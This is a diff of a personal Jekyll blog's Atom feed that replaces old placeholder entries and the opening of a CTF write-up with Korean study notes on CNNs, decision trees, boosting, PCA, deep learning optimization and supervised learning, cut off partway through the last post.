@@ -1,4 +1,1021 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-07-09T14:41:44+09:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">DévEnCours</title><subtitle>Un carnet d’essais, d’erreurs et d’apprentissages.</subtitle><author><name>Yoo</name></author><entry><title type="html">Weekly paper - sprint bootcamp</title><link href="http://localhost:4000/sprint/WeeklyPaper/" rel="alternate" type="text/html" title="Weekly paper - sprint bootcamp" /><published>2025-07-09T00:00:00+09:00</published><updated>2025-07-09T00:00:00+09:00</updated><id>http://localhost:4000/sprint/WeeklyPaper</id><content type="html" xml:base="http://localhost:4000/sprint/WeeklyPaper/"><![CDATA[]]></content><author><name>Yoo</name></author><category term="sprint" /><category term="python" /><category term="AI engineering" /><category term="Github" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">test</title><link href="http://localhost:4000/blog/daily/" rel="alternate" type="text/html" title="test" /><published>2025-07-09T00:00:00+09:00</published><updated>2025-07-09T00:00:00+09:00</updated><id>http://localhost:4000/blog/daily</id><content type="html" xml:base="http://localhost:4000/blog/daily/"><![CDATA[<p>이건 테스트용</p>]]></content><author><name>Yoo</name></author><category term="blog" /><category term="python" /><category term="AI engineering" /><category term="Github" /><summary type="html"><![CDATA[이건 테스트용]]></summary></entry><entry><title type="html">Snow-crash Level09</title><link href="http://localhost:4000/ecole42/Level09/" rel="alternate" type="text/html" title="Snow-crash Level09" /><published>2024-02-15T00:00:00+09:00</published><updated>2024-02-15T00:00:00+09:00</updated><id>http://localhost:4000/ecole42/Level09</id><content type="html" xml:base="http://localhost:4000/ecole42/Level09/"><![CDATA[<h4 id="1-the-password-of-level09-is-the-token-that-got-from-level08">1. The password of <code class="language-plaintext highlighter-rouge">Level09</code> is the token that got from <code class="language-plaintext highlighter-rouge">Level08</code>.</h4>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.3">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2025-07-30T00:26:36+09:00</updated><id>/feed.xml</id><title type="html">DévEnCours</title><subtitle>Un carnet d’essais, d’erreurs et d’apprentissages.</subtitle><author><name>Yoo</name></author><entry><title type="html">[Deep Learning] CNN (Convolutional Neural Network)</title><link href="/deeplearning/CNN/" rel="alternate" type="text/html" title="[Deep Learning] CNN (Convolutional Neural Network)" /><published>2025-07-29T00:00:00+09:00</published><updated>2025-07-29T00:00:00+09:00</updated><id>/deeplearning/CNN</id><content type="html" xml:base="/deeplearning/CNN/"><![CDATA[<h2 id="cnn-convolutional-neural-network이란">CNN (Convolutional Neural Network)이란?</h2>
+
+<p><strong>CNN</strong>은 주로 이미지 인식과 같은 <strong>컴퓨터 비전 분야</strong>의 데이터를 분석하기 위해 사용되는 인공 신경망의 한 종류입니다. 핵심은 <strong>합성곱(Convolution) 연산</strong>을 사용한다는 점입니다.</p>
+
+<hr />
+
+<h2 id="컴퓨터는-이미지를-어떻게-볼까">컴퓨터는 이미지를 어떻게 볼까?</h2>
+
+<h3 id="흑백-이미지">흑백 이미지</h3>
+<ul>
+  <li><strong>단일 채널</strong> 사용</li>
+  <li>각 픽셀은 <strong>0~255 범위</strong>의 하나의 값만 가짐</li>
+  <li>명암의 정도를 나타냄</li>
+</ul>
+
+<h3 id="컬러-이미지">컬러 이미지</h3>
+<ul>
+  <li><strong>RGB 3개 채널</strong> 사용</li>
+  <li>각 채널은 <strong>0~255 값</strong>을 가짐</li>
+  <li>세 채널의 조합으로 다양한 색상 표현</li>
+</ul>
+
+<hr />
+
+<h2 id="fcn-fully-connected-network의-한계">FCN (Fully Connected Network)의 한계</h2>
+
+<p>전통적인 FCN으로 이미지를 처리할 때 발생하는 문제들:</p>
+
+<ul>
+  <li><strong>파라미터 수의 폭발적 증가</strong> → 과적합 위험 및 계산 비용 증가</li>
+  <li><strong>확장성 부족</strong> → 대용량 이미지 처리의 어려움</li>
+  <li><strong>인접 픽셀 관계 반영 불가</strong> → 공간적 정보 손실</li>
+  <li><strong>1차원 벡터 변환</strong> → 패턴 학습의 어려움</li>
+</ul>
+
+<hr />
+
+<h2 id="사람은-어떻게-이미지를-인식하는가">사람은 어떻게 이미지를 인식하는가?</h2>
+
+<h3 id="고양이-뉴런-실험-hubel--wiesel-1959">고양이 뉴런 실험 (Hubel &amp; Wiesel, 1959)</h3>
+<ul>
+  <li>특정 뉴런이 <strong>수직, 수평, 대각선</strong>에 각각 반응하는 것을 관측</li>
+  <li><strong>전체 뉴런이 아닌 특정 뉴런</strong>이 활성화되는 현상 발견</li>
+  <li>각 뉴런의 <strong>전문화된 역할</strong> 존재 확인</li>
+</ul>
+
+<h3 id="cnn의-계층적-인식-과정">CNN의 계층적 인식 과정</h3>
+<ol>
+  <li><strong>1단계</strong>: 선과 같은 <strong>단순한 특징</strong> 잡아내기</li>
+  <li><strong>2단계</strong>: 모서리, 경계선 등 <strong>중간 복잡도 특징</strong> 학습</li>
+  <li><strong>3단계</strong>: 부분과 전체를 연결하는 <strong>복잡한 특징</strong> 인식</li>
+</ol>
+
+<hr />
+
+<h2 id="cnn의-역사">CNN의 역사</h2>
+
+<h3 id="lenet-5-1998">LeNet-5 (1998)</h3>
+<ul>
+  <li><strong>얀 르쿤(Yann LeCun)</strong>에 의해 개발</li>
+  <li>CNN의 <strong>최초 구현 모델</strong></li>
+  <li>손글씨 인식에 혁신적인 성과 달성</li>
+</ul>
+
+<hr />
+
+<h2 id="cnn의-핵심-특징">CNN의 핵심 특징</h2>
+
+<h3 id="1-부분-연결-local-connectivity">1. 부분 연결 (Local Connectivity)</h3>
+<ul>
+  <li>전체 이미지를 한 번에 분석하지 않음</li>
+  <li><strong>작은 지역부터 점진적 학습</strong></li>
+  <li>FCN과 차별화되는 핵심 특징</li>
+</ul>
+
+<h3 id="2-가중치-공유-weight-sharing">2. 가중치 공유 (Weight Sharing)</h3>
+<ul>
+  <li><strong>동일한 필터</strong>를 이미지 전체에 적용</li>
+  <li>파라미터 수 대폭 감소</li>
+  <li><strong>계산 효율성 향상</strong></li>
+</ul>
+
+<h3 id="3-계층적-특성-hierarchical-feature-learning">3. 계층적 특성 (Hierarchical Feature Learning)</h3>
+<ul>
+  <li><strong>하위 레이어</strong>: 단순한 특징 (선, 모서리)</li>
+  <li><strong>상위 레이어</strong>: 복잡한 특징 (얼굴, 객체)</li>
+  <li>점진적으로 추상화된 특징 학습</li>
+</ul>
+
+<hr />
+
+<h2 id="-cnn의-장점">💡 CNN의 장점</h2>
+
+<table>
+  <thead>
+    <tr>
+      <th>특징</th>
+      <th>설명</th>
+      <th>효과</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><strong>공간 불변성</strong></td>
+      <td>객체의 위치에 관계없이 인식</td>
+      <td>견고한 패턴 인식</td>
+    </tr>
+    <tr>
+      <td><strong>파라미터 효율성</strong></td>
+      <td>가중치 공유로 파라미터 수 감소</td>
+      <td>학습 속도 향상</td>
+    </tr>
+    <tr>
+      <td><strong>계층적 학습</strong></td>
+      <td>단순→복잡 특징의 점진적 학습</td>
+      <td>효과적인 특징 추출</td>
+    </tr>
+    <tr>
+      <td><strong>확장성</strong></td>
+      <td>다양한 크기의 이미지 처리 가능</td>
+      <td>실용적 응용</td>
+    </tr>
+  </tbody>
+</table>
+
+<hr />
+
+<h2 id="-다음-단계">🚀 다음 단계</h2>
+
+<p>CNN의 기본 개념을 이해했으니, 다음에는:</p>
+<ul>
+  <li><strong>합성곱 연산의 수학적 원리</strong></li>
+  <li><strong>풀링(Pooling) 레이어의 역할</strong></li>
+  <li><strong>실제 CNN 아키텍처 분석</strong></li>
+  <li><strong>이미지 분류 실습</strong></li>
+</ul>
+
+<p>에 대해 알아보겠습니다!</p>
+
+<hr />
+
+<p><em>이 글은 Deep Learning Sprint Bootcamp의 일부입니다.</em></p>]]></content><author><name>Yoo</name></author><category term="deeplearning" /><category term="python" /><category term="AI engineering" /><category term="deep learning" /><category term="CNN" /><category term="computer vision" /><summary type="html"><![CDATA[컴퓨터 비전의 핵심 기술, CNN의 원리와 특징에 대해 알아보자]]></summary></entry><entry><title type="html">위클리 페이퍼 3</title><link href="/sprint/Weekly-Paper-3/" rel="alternate" type="text/html" title="위클리 페이퍼 3" /><published>2025-07-29T00:00:00+09:00</published><updated>2025-07-29T00:00:00+09:00</updated><id>/sprint/Weekly%20Paper%203</id><content type="html" xml:base="/sprint/Weekly-Paper-3/"><![CDATA[<h2 id="결정-트리의-장점과-단점">결정 트리의 장점과 단점</h2>
+
+<p>결정 트리는 데이터를 분류하거나 예측하기 위해 사용되는 지도학습 알고리즘</p>
+
+<h3 id="장점">장점</h3>
+
+<h4 id="1-쉽고-직관적인-이해-가능성">1. 쉽고 직관적인 이해 가능성</h4>
+
+<ul>
+  <li><strong>시각적 표현</strong>: 계층 구조를 통해 어떤 속성이 중요한지 쉽게 파악 가능</li>
+  <li><strong>투명성</strong>: 신경망과 달리 내부 작동 방식이 명확하게 드러남</li>
+  <li><strong>해석 용이성</strong>: 의사결정 과정을 단계별로 추적 가능</li>
+</ul>
+
+<h4 id="2-적은-데이터-전처리-요구">2. 적은 데이터 전처리 요구</h4>
+
+<ul>
+  <li><strong>다양한 데이터 타입 처리</strong>: 불연속형, 연속형 데이터 모두 처리 가능</li>
+  <li><strong>자동 분할</strong>: 연속형 데이터는 임계값 기준으로 자동 분할</li>
+  <li><strong>결측값 처리</strong>: 결측값이 있어도 일정 수준까지 잘 처리 가능</li>
+</ul>
+
+<h4 id="3-높은-유연성과-범용성">3. 높은 유연성과 범용성</h4>
+
+<ul>
+  <li><strong>다양한 문제 해결</strong>: 회귀(Regression), 분류(Classification) 모두에 활용 가능</li>
+  <li><strong>다중공선성 문제 해결</strong>: 변수 간 상관관계에 민감하지 않음</li>
+  <li><strong>효율적 속성 선택</strong>: 적절한 속성만 선택해 분기함으로써 과도한 중복 감소</li>
+</ul>
+
+<h3 id="단점">단점</h3>
+
+<h4 id="1-과적합에-취약">1. 과적합에 취약</h4>
+
+<p><strong>문제점:</strong></p>
+<ul>
+  <li>복잡한 트리는 훈련 데이터에 너무 맞춰져 새로운 데이터에 대한 일반화 성능 저하</li>
+</ul>
+
+<p><strong>해결 방법:</strong></p>
+<ul>
+  <li><strong>사전 가지치기 (Pre-pruning)</strong>: 트리 성장을 조기에 멈춤</li>
+  <li><strong>사후 가지치기 (Post-pruning)</strong>: 완성된 트리에서 불필요한 가지 제거</li>
+</ul>
+
+<h4 id="2-높은-분산variance">2. 높은 분산(Variance)</h4>
+
+<p><strong>문제점:</strong></p>
+<ul>
+  <li>입력 데이터에 조금만 변화가 있어도 트리 구조가 크게 바뀔 수 있음</li>
+  <li>안정성이 낮음</li>
+</ul>
+
+<p><strong>해결 방법:</strong></p>
+<ul>
+  <li><strong>배깅(Bagging)</strong>: 특히 랜덤 포레스트(Random Forest) 같은 앙상블 기법 활용</li>
+</ul>
+
+<h4 id="3-비용-문제-계산-자원-및-시간">3. 비용 문제 (계산 자원 및 시간)</h4>
+
+<p><strong>문제점:</strong></p>
+<ul>
+  <li>탐욕적(Greedy) 알고리즘 사용으로 가능한 모든 분할 조건을 탐색</li>
+  <li>대규모 데이터셋에서는 훈련 속도와 자원 소모가 큼</li>
+</ul>
+
+<hr />
+
+<h2 id="부스팅-boosting-앙상블-기법">부스팅 (Boosting) 앙상블 기법</h2>
+
+<p>부스팅은 훈련 오류를 최소화하기 위해 <strong>약한 학습자 집합을 강한 학습자로 결합</strong>하는 앙상블 학습 방법입니다.</p>
+
+<h3 id="부스팅의-핵심-원리">부스팅의 핵심 원리</h3>
+
+<ul>
+  <li><strong>순차적 학습</strong>: 이전 분류기의 학습 결과를 토대로 다음 분류기의 학습 데이터 샘플 가중치 조정</li>
+  <li><strong>점진적 개선</strong>: 먼저 생성된 모델을 꾸준히 개선해 나가는 방향으로 학습 진행</li>
+  <li><strong>오답 가중치 부여</strong>: 오답에 대해 높은 가중치를 부여하여 정확도 향상</li>
+</ul>
+
+<h3 id="주요-부스팅-알고리즘">주요 부스팅 알고리즘</h3>
+
+<h4 id="1-adaboost-adaptive-boosting">1. AdaBoost (Adaptive Boosting)</h4>
+
+<p><strong>특징:</strong></p>
+<ul>
+  <li>가장 기본적인 부스팅 알고리즘</li>
+  <li>오분류된 샘플에 더 높은 가중치 부여</li>
+  <li>각 약한 학습기의 가중치를 계산하여 최종 예측에 반영</li>
+</ul>
+
+<h4 id="2-gradient-boosting">2. Gradient Boosting</h4>
+
+<p><strong>개발자:</strong> Jerome H. Friedman (Leo Breiman의 작업을 바탕으로)</p>
+
+<p><strong>특징:</strong></p>
+<ul>
+  <li><strong>순차적 예측 변수 추가</strong>: 앙상블에 예측 변수를 순차적으로 추가</li>
+  <li><strong>잔차 오류 기반 학습</strong>: 이전 예측 변수의 잔차 오류에 따라 훈련</li>
+  <li><strong>그래디언트 하강법 결합</strong>: 그래디언트 하강법 알고리즘과 부스팅 방법을 결합</li>
+</ul>
+
+<p><strong>AdaBoost와의 차이점:</strong></p>
+<ul>
+  <li>데이터 포인트의 가중치를 변경하는 대신 이전 예측 변수의 잔차 오류에 따라 훈련</li>
+</ul>
+
+<h4 id="3-xgboost-extreme-gradient-boosting">3. XGBoost (Extreme Gradient Boosting)</h4>
+
+<p><strong>특징:</strong></p>
+<ul>
+  <li><strong>고성능 구현</strong>: 계산 속도와 규모를 위해 설계된 그래디언트 부스팅의 구현</li>
+  <li><strong>병렬 처리</strong>: CPU의 여러 코어를 활용하여 훈련 중에 병렬로 학습 가능</li>
+  <li><strong>정규화</strong>: 과적합 방지를 위한 정규화 기법 포함</li>
+  <li><strong>조기 종료</strong>: 검증 성능이 개선되지 않으면 학습을 조기에 종료</li>
+</ul>
+
+<h3 id="부스팅의-장단점">부스팅의 장단점</h3>
+
+<table>
+  <thead>
+    <tr>
+      <th>구분</th>
+      <th>내용</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><strong>장점</strong></td>
+      <td>- 높은 예측 정확도<br />- 과적합에 상대적으로 강함<br />- 다양한 데이터 타입 처리 가능</td>
+    </tr>
+    <tr>
+      <td><strong>단점</strong></td>
+      <td>- 학습 시간이 오래 걸림<br />- 해석이 어려움<br />- 하이퍼파라미터 튜닝이 복잡함</td>
+    </tr>
+  </tbody>
+</table>
+
+<hr />
+
+<h2 id="차원-축소-기법-주성분-분석-vs-요인-분석">차원 축소 기법: 주성분 분석 vs 요인 분석</h2>
+
+<h3 id="주성분-분석-pca---principal-component-analysis">주성분 분석 (PCA - Principal Component Analysis)</h3>
+
+<p><strong>목적:</strong></p>
+<ul>
+  <li>고차원 데이터를 저차원으로 축소</li>
+  <li>데이터의 분산을 최대한 보존</li>
+</ul>
+
+<p><strong>특징:</strong></p>
+<ul>
+  <li><strong>비지도 학습</strong>: 레이블 정보를 사용하지 않음</li>
+  <li><strong>선형 변환</strong>: 원본 변수들의 선형 조합으로 새로운 변수 생성</li>
+  <li><strong>분산 기반</strong>: 데이터의 분산을 최대화하는 방향으로 주성분 결정</li>
+</ul>
+
+<p><strong>활용 분야:</strong></p>
+<ul>
+  <li>이미지 압축</li>
+  <li>노이즈 제거</li>
+  <li>시각화</li>
+  <li>특성 추출</li>
+</ul>
+
+<h3 id="요인-분석-factor-analysis">요인 분석 (Factor Analysis)</h3>
+
+<p><strong>목적:</strong></p>
+<ul>
+  <li>관찰된 변수들을 잠재적 요인들로 설명</li>
+  <li>변수 간의 상관관계 구조 파악</li>
+</ul>
+
+<p><strong>특징:</strong></p>
+<ul>
+  <li><strong>잠재 변수 모델</strong>: 관찰되지 않는 잠재 요인들을 추정</li>
+  <li><strong>확률적 모델</strong>: 오차 항을 포함한 확률적 구조</li>
+  <li><strong>해석 가능성</strong>: 요인들이 의미 있는 개념을 나타내도록 설계</li>
+</ul>
+
+<p><strong>활용 분야:</strong></p>
+<ul>
+  <li>심리학 연구</li>
+  <li>설문조사 분석</li>
+  <li>사회과학 연구</li>
+  <li>시장 조사</li>
+</ul>
+
+<h3 id="주요-차이점">주요 차이점</h3>
+
+<table>
+  <thead>
+    <tr>
+      <th>구분</th>
+      <th>주성분 분석 (PCA)</th>
+      <th>요인 분석 (FA)</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><strong>목적</strong></td>
+      <td>차원 축소, 분산 보존</td>
+      <td>잠재 요인 발견, 변수 간 관계 설명</td>
+    </tr>
+    <tr>
+      <td><strong>방법</strong></td>
+      <td>선형 변환</td>
+      <td>확률적 모델</td>
+    </tr>
+    <tr>
+      <td><strong>해석</strong></td>
+      <td>수학적 최적화</td>
+      <td>의미적 해석</td>
+    </tr>
+    <tr>
+      <td><strong>오차</strong></td>
+      <td>고려하지 않음</td>
+      <td>오차 항 포함</td>
+    </tr>
+    <tr>
+      <td><strong>유연성</strong></td>
+      <td>제한적</td>
+      <td>더 유연한 모델링</td>
+    </tr>
+  </tbody>
+</table>
+
+<hr />]]></content><author><name>Yoo</name></author><category term="sprint" /><category term="python" /><category term="AI engineering" /><category term="machine learning" /><category term="decision tree" /><category term="boosting" /><category term="dimensionality reduction" /><summary type="html"><![CDATA[결정 트리의 장단점, 부스팅 기법, 차원 축소 방법에 대한 심화 학습]]></summary></entry><entry><title type="html">[Deep Learning] 딥러닝의 핵심 개념과 최적화</title><link href="/deeplearning/DeepLearning/" rel="alternate" type="text/html" title="[Deep Learning] 딥러닝의 핵심 개념과 최적화" /><published>2025-07-29T00:00:00+09:00</published><updated>2025-07-29T00:00:00+09:00</updated><id>/deeplearning/DeepLearning</id><content type="html" xml:base="/deeplearning/DeepLearning/"><![CDATA[<h2 id="딥러닝-모델의-최적화가-어려운-이유">딥러닝 모델의 최적화가 어려운 이유</h2>
+
+<p>딥러닝 모델을 최적화하는 과정에서 발생하는 주요 문제들과 그 원인을 살펴보겠습니다.</p>
+
+<h3 id="1-모델의-비선형성">1. 모델의 비선형성</h3>
+
+<p><strong>활성화 함수의 비선형성</strong>으로 인해 손실 함수의 지형이 매우 복잡해집니다.</p>
+
+<ul>
+  <li><strong>비볼록(Non-convex) 지형</strong> 형성</li>
+  <li>복잡하고 울퉁불퉁한 표면</li>
+  <li><strong>전역 최솟값을 찾기 어려움</strong></li>
+</ul>
+
+<h3 id="2-고차원성과-과적합">2. 고차원성과 과적합</h3>
+
+<p><strong>많은 개수의 파라미터</strong>를 포함하여 차원이 증가하면서 발생하는 문제:</p>
+
+<ul>
+  <li><strong>과적합 위험 증가</strong></li>
+  <li>과적합: 학습 데이터에 너무 과도하게 맞춰져서 새로운 데이터에 대한 예측 성능 저하</li>
+  <li>모델의 일반화 능력 저하</li>
+</ul>
+
+<h3 id="3-그래디언트-소실-gradient-vanishing">3. 그래디언트 소실 (Gradient Vanishing)</h3>
+
+<p><strong>시그모이드 함수</strong>의 특성으로 인한 문제:</p>
+
+<ul>
+  <li>0과 1 사이를 벗어나면 기울기가 0에 수렴</li>
+  <li><strong>연쇄 법칙(체인룰)</strong>에 따라 여러 층을 거치면서 작은 기울기 값들이 계속 곱해짐</li>
+  <li>앞쪽(입력층에 가까운) 층으로 갈수록 기울기가 기하급수적으로 작아짐</li>
+  <li><strong>가중치 업데이트가 거의 이루어지지 않음</strong></li>
+</ul>
+
+<h3 id="4-하이퍼파라미터의-민감성">4. 하이퍼파라미터의 민감성</h3>
+
+<p><strong>사용자가 사전에 설정해야 할 값</strong>으로, 성능 최적화에 매우 중요:</p>
+
+<ul>
+  <li>설정 변수의 적절한 조정이 최적의 모델을 위해 필수</li>
+  <li>잘못된 설정 시 모델 성능 크게 저하</li>
+</ul>
+
+<hr />
+
+<h2 id="하이퍼파라미터-hyperparameter">하이퍼파라미터 (Hyperparameter)</h2>
+
+<p>딥러닝 모델링 시 <strong>필수적으로 고려할 사항</strong>으로, 사용자가 사전에 설정해야 하는 값입니다.</p>
+
+<h3 id="1-배치-크기-batch-size">1. 배치 크기 (Batch Size)</h3>
+
+<p><strong>한 번의 학습에 사용되는 샘플의 수</strong></p>
+
+<ul>
+  <li><strong>메모리 사용량</strong> 때문에 배치 사이즈를 한 번에 올릴 수 없음</li>
+  <li><strong>학습 속도</strong>에 직접적인 영향</li>
+  <li>일반적으로 32, 64, 128, 256 등 사용</li>
+</ul>
+
+<h3 id="2-학습률-learning-rate-α">2. 학습률 (Learning Rate, α)</h3>
+
+<p><strong>가중치를 어느 정도로 업데이트할지 결정하는 매개변수</strong></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>새로운 가중치 = 이전 가중치 - 학습률(α) × 기울기
+</code></pre></div></div>
+
+<p><strong>문제점:</strong></p>
+<ul>
+  <li><strong>너무 낮으면</strong>: 학습이 지나치게 느려짐</li>
+  <li><strong>너무 높으면</strong>: 손실함수가 최적값 주변에서 요동치거나 발산</li>
+</ul>
+
+<h3 id="3-에폭-수-epoch">3. 에폭 수 (Epoch)</h3>
+
+<p><strong>전체 훈련 데이터셋이 네트워크를 통과하는 횟수</strong></p>
+
+<ul>
+  <li><strong>너무 많으면</strong>: 학습 시간 증가, 과적합 초래</li>
+  <li><strong>너무 적으면</strong>: 학습 부족으로 성능 저하</li>
+</ul>
+
+<h3 id="4-옵티마이저-optimizer">4. 옵티마이저 (Optimizer)</h3>
+
+<p><strong>손실함수를 최소화하기 위해 모델의 가중치를 어떻게 업데이트할지 결정</strong></p>
+
+<ul>
+  <li>확률적 경사하강법 (SGD)</li>
+  <li>Adam</li>
+  <li>Momentum</li>
+  <li>RMSprop 등</li>
+</ul>
+
+<hr />
+
+<h2 id="활성화-함수-activation-function">활성화 함수 (Activation Function)</h2>
+
+<p><strong>뉴런에서 입력신호의 총합을 받아 출력신호로 변환하는 역할</strong></p>
+
+<h3 id="1-시그모이드-함수-sigmoid">1. 시그모이드 함수 (Sigmoid)</h3>
+
+<p><strong>초기 신경망에서 널리 사용</strong></p>
+
+<ul>
+  <li><strong>출력 범위</strong>: 0~1</li>
+  <li><strong>문제점</strong>: 0과 1을 벗어난 부분에서 <strong>그래디언트 소실 문제</strong>가 심함</li>
+</ul>
+
+<h3 id="2-하이퍼볼릭-탄젠트-함수-tanh">2. 하이퍼볼릭 탄젠트 함수 (tanh)</h3>
+
+<p><strong>시그모이드의 변형함수</strong></p>
+
+<ul>
+  <li><strong>출력 범위</strong>: -1~1로 확장</li>
+  <li><strong>장점</strong>: 학습 초기에 빠른 수렴에 도움</li>
+  <li><strong>문제점</strong>: 여전히 그래디언트 소실 문제 존재</li>
+</ul>
+
+<h3 id="3-relu-함수-rectified-linear-unit">3. ReLU 함수 (Rectified Linear Unit)</h3>
+
+<p><strong>현대 신경망에서 가장 인기 있는 함수</strong></p>
+
+<ul>
+  <li><strong>양수 입력</strong>: 그대로 출력, 그래디언트 감소하지 않고 효과적으로 전달</li>
+  <li><strong>음수 입력</strong>: 0을 출력, 그래디언트도 0, 가중치 업데이트 제한</li>
+</ul>
+
+<h3 id="4-leaky-relu-함수">4. Leaky ReLU 함수</h3>
+
+<p><strong>ReLU 함수의 보완 버전</strong></p>
+
+<ul>
+  <li><strong>음수 입력</strong>: 아주 작은 기울기 유지</li>
+  <li><strong>장점</strong>: ReLU의 장점을 유지하면서 그래디언트 소실 문제 완화</li>
+</ul>
+
+<hr />
+
+<h2 id="경사하강법-gradient-descent">경사하강법 (Gradient Descent)</h2>
+
+<p><strong>최적화 알고리즘의 일종</strong>으로, 여러 번 반복하여 최적의 가중치를 찾아나가는 과정</p>
+
+<h3 id="용어-정리">용어 정리</h3>
+
+<ul>
+  <li><strong>배치 (Batch)</strong>: 한 번의 학습 단계에 사용되는 학습 데이터의 묶음</li>
+  <li><strong>에폭 (Epoch)</strong>: 전체 학습 데이터셋을 한 번 학습하는 과정</li>
+</ul>
+
+<h3 id="1-배치-경사하강법-batch-gradient-descent">1. 배치 경사하강법 (Batch Gradient Descent)</h3>
+
+<p><strong>기울기 계산에 전체 데이터셋 사용</strong></p>
+
+<ul>
+  <li><strong>장점</strong>: 모든 데이터를 보고 최적을 찾음</li>
+  <li><strong>단점</strong>: 대규모 데이터셋에서는 <strong>계산 비용이 높음</strong></li>
+</ul>
+
+<h3 id="2-확률적-경사하강법-stochastic-gradient-descent-sgd">2. 확률적 경사하강법 (Stochastic Gradient Descent, SGD)</h3>
+
+<p><strong>각 반복에서 무작위로 선택된 하나의 데이터 샘플 사용</strong></p>
+
+<ul>
+  <li><strong>장점</strong>: 배치보다 계산 속도 빠름</li>
+  <li><strong>단점</strong>: 경사의 추정이 불안정해서 학습 과정이 매끄럽지 않음</li>
+</ul>
+
+<h3 id="3-미니배치-경사하강법-mini-batch-gradient-descent">3. 미니배치 경사하강법 (Mini-batch Gradient Descent)</h3>
+
+<p><strong>배치 경사하강과 확률적 경사하강의 절충안</strong></p>
+
+<ul>
+  <li><strong>장점</strong>:
+    <ul>
+      <li>높은 메모리 효율</li>
+      <li>빠른 계산 속도</li>
+      <li>지역 최솟값에 갇힐 가능성 감소</li>
+    </ul>
+  </li>
+  <li><strong>단점</strong>: 배치 크기 등 하이퍼파라미터에 매우 민감</li>
+</ul>
+
+<hr />
+
+<h2 id="출력-함수-output-function">출력 함수 (Output Function)</h2>
+
+<h3 id="회귀-문제">회귀 문제</h3>
+<ul>
+  <li><strong>출력</strong>: 연속적인 값</li>
+  <li><strong>예시</strong>: 집값 예측, 온도 예측</li>
+</ul>
+
+<h3 id="분류-문제">분류 문제</h3>
+
+<h4 id="이진-분류">이진 분류</h4>
+<ul>
+  <li><strong>함수</strong>: 시그모이드 함수</li>
+  <li><strong>출력</strong>: 0과 1 사이의 확률값</li>
+</ul>
+
+<h4 id="다중-분류">다중 분류</h4>
+<ul>
+  <li><strong>함수</strong>: 소프트맥스 함수 (Softmax)</li>
+  <li><strong>출력</strong>: 각 클래스에 대한 확률 분포</li>
+</ul>
+
+<hr />
+
+<h2 id="손실-함수-loss-function">손실 함수 (Loss Function)</h2>
+
+<p><strong>모델이 실제값을 얼마나 잘 예측하는지를 측정</strong>하는 함수</p>
+
+<h3 id="목표">목표</h3>
+<p>예측값과 실제값의 차이인 손실함수의 값을 <strong>가능한 작게</strong> 만들어야 함</p>
+
+<h3 id="종류별-손실-함수">종류별 손실 함수</h3>
+
+<h4 id="1-회귀-문제">1. 회귀 문제</h4>
+<ul>
+  <li><strong>MSE (Mean Squared Error, 평균제곱오차)</strong></li>
+  <li>숫자를 예측하는 문제에 사용</li>
+</ul>
+
+<h4 id="2-분류-문제">2. 분류 문제</h4>
+
+<p><strong>이진 분류</strong></p>
+<ul>
+  <li><strong>이진 교차 엔트로피 (Binary Cross Entropy)</strong></li>
+  <li>두 가지 클래스 중 하나로 분류하는 문제</li>
+</ul>
+
+<p><strong>다중 분류</strong></p>
+<ul>
+  <li><strong>교차 엔트로피 (Cross Entropy)</strong></li>
+  <li>세 가지 이상의 클래스 중 하나로 분류하는 문제</li>
+</ul>
+
+<hr />
+
+<h2 id="핵심-포인트-정리">핵심 포인트 정리</h2>
+
+<table>
+  <thead>
+    <tr>
+      <th>개념</th>
+      <th>설명</th>
+      <th>중요성</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><strong>비선형성</strong></td>
+      <td>활성화 함수로 인한 복잡한 손실 함수 지형</td>
+      <td>전역 최솟값 찾기 어려움</td>
+    </tr>
+    <tr>
+      <td><strong>고차원성</strong></td>
+      <td>많은 파라미터로 인한 과적합 위험</td>
+      <td>일반화 능력 저하</td>
+    </tr>
+    <tr>
+      <td><strong>그래디언트 소실</strong></td>
+      <td>깊은 네트워크에서 기울기 전파 문제</td>
+      <td>학습 효율성 저하</td>
+    </tr>
+    <tr>
+      <td><strong>하이퍼파라미터</strong></td>
+      <td>사용자가 설정하는 학습 관련 변수</td>
+      <td>모델 성능에 직접적 영향</td>
+    </tr>
+  </tbody>
+</table>
+
+<hr />]]></content><author><name>Yoo</name></author><category term="deeplearning" /><category term="python" /><category term="AI engineering" /><category term="deep learning" /><category term="machine learning" /><category term="neural networks" /><summary type="html"><![CDATA[딥러닝 모델의 최적화 방법과 핵심 개념들을 체계적으로 알아보자]]></summary></entry><entry><title type="html">위클리 페이퍼 2</title><link href="/sprint/WeeklyPaPer2/" rel="alternate" type="text/html" title="위클리 페이퍼 2" /><published>2025-07-21T00:00:00+09:00</published><updated>2025-07-21T00:00:00+09:00</updated><id>/sprint/WeeklyPaPer2</id><content type="html" xml:base="/sprint/WeeklyPaPer2/"><![CDATA[<h2 id="지도학습과-비지도학습의-차이">지도학습과 비지도학습의 차이</h2>
+
+<p>머신러닝에서 프로그램은 ‘학습(Learning)’을 하게 됩니다. 이때, 학습을 하는 방법에 따라 크게 <strong>지도학습</strong>과 <strong>비지도학습</strong>으로 나뉠 수 있습니다.</p>
+
+<h3 id="지도학습-supervised-learning">지도학습 (Supervised Learning)</h3>
+
+<p><strong>정답이 있는 데이터(레이블링된 데이터)</strong> 를 사용하여 모델을 훈련시키는 학습 방법</p>
+
+<p><strong>주요 특징:</strong></p>
+<ul>
+  <li>입력 데이터와 정답(레이블)이 쌍으로 제공</li>
+  <li>모델이 입력과 출력 간의 관계를 학습</li>
+  <li>예측 성능을 정확히 측정 가능</li>
+</ul>
+
+<p><strong>예시:</strong></p>
+<ul>
+  <li><strong>분류</strong>: 스팸 메일 분류, 이미지 분류, 질병 진단</li>
